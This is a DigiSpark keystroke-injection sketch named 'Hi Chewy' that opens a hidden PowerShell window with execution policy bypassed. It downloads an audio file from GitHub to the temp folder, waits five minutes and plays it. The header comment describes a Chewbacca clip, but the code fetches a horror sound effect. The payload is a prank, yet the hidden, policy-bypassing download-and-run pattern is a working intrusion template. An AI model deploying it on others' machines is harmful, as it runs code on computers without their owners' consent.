//Hi Chewy opens a hidden powershell window, downloads a 60 second wav file of random Chewbacca from Star Wars clips, and then 
//waits 5 minutes and plays it

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell -NoP -Win H -Noni -Exec Bypass"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("start-sleep 300;"));
  DigiKeyboard.print(F("irm -uri \"https://github.com/Mah3Sec/DigiSpark-Scripts/blob/master/Hi_Chewy/horror%20sound%20effect.mp3" -OutFile \"$env:temp\\play.mp3\";"));
  DigiKeyboard.print(F("Add-Type -AssemblyName presentationCore;"));
  DigiKeyboard.print(F("$filepath = [uri] \"$env:temp\\play.mp3\";"));
  DigiKeyboard.print(F("$wmplayer = New-Object System.Windows.Media.MediaPlayer;"));
  DigiKeyboard.print(F("$wmplayer.Open($filepath);"));
  DigiKeyboard.print(F("Start-Sleep 2;"));
  DigiKeyboard.print(F("$duration = $wmplayer.NaturalDuration.TimeSpan.TotalSeconds;"));
  DigiKeyboard.print(F("$wmplayer.Play();"));
  DigiKeyboard.print(F("Start-Sleep $duration;"));
  DigiKeyboard.print(F("$wmplayer.Stop();"));
  DigiKeyboard.print(F("$wmplayer.Close();"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
